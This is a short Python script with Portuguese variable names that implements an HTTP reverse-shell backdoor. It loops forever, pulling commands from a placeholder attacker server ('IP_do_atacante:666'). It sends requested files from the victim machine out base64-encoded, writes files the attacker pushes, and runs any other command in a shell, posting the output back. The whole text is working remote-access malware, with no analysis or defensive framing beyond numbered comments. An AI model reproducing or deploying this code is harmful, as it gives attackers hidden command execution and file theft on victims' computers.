import requests, subprocess, time, base64

atacante = "http://IP_do_atacante:666"

while True:
    try:
        requisicao = requests.get(atacante) #1
        comando = requisicao.text #2

        if comando.startswith("download"): #3
            arquivo = comando.split()[1]
            with open(arquivo, "rb") as conteudo:
                corpoPOST = base64.b64encode(conteudo.read())
            requests.post(url = atacante + "/download", data = corpoPOST) #4

        elif comando.startswith("upload"): #5
            arquivo = comando.split()[1] #6
            conteudo = base64.b64decode(comando.split()[2]) #7
            with open(arquivo, "wb") as arquivoUpload:
                arquivoUpload.write(conteudo)
            corpoPOST = "Upload enviado com sucesso"
            requests.post(url = atacante, data = corpoPOST) #8

        else: #9
            cmd = subprocess.Popen(comando, shell = True,
                                        stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE)
            corpoPOST = cmd.stdout.read() + cmd.stderr.read()
            requests.post(url = atacante, data = corpoPOST ) #10

    except Exception:
        time.sleep(4)